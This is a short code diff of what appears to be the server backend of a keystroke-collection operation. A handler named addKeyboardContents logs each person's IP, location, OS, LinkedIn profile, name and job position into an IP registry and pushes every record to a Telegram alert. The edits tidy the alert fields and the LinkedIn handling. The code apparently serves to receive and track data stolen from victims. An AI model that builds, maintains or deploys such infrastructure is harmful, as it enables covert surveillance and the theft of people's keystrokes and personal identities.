@@ -25,10 +25,10 @@ function extractCountry(location) {
 }
 
 async function sendTelegramAlert(data) {
-  const msg = `*OS:* ${data.os || "—"} 
+  const msg = `*OS:* ${data.os} 
 *Location:* ${data.location} 
 *IP:* ${data.ip}
-*LinkedIn:* ${data.linkedin || "—"} 
+*LinkedIn:* ${data.linkedin} 
 *Name:* ${data.fullName}
 *Time:* ${new Date().toLocaleString("en-US", { timeZone: "UTC" })} UTC
 *Position:* ${data.position}
@@ -77,7 +77,7 @@ async function addKeyboardContents(req, res, db) {
 
     // Generate displayName with special format if linkedin exists
     let displayName;
-    if (linkedin) {
+    if (linkedin != "unavailable") {
       // Example: 2026_06_23_15_28_22_United_States_134_88_96_241_LK
       displayName = `${fmtTs(now)}_${country}_${safeIP}_LK`;
     } else {
@@ -89,10 +89,10 @@ async function addKeyboardContents(req, res, db) {
       ip,
       location,
       country,
+	  linkedin,
       os: os || "",
       latestTs: timestamp,
       displayName,
-      firstSeen: timestamp,
     };
 
     // ── 1. Insert into IPRegistry collection (no update, only insert) ─────────────────
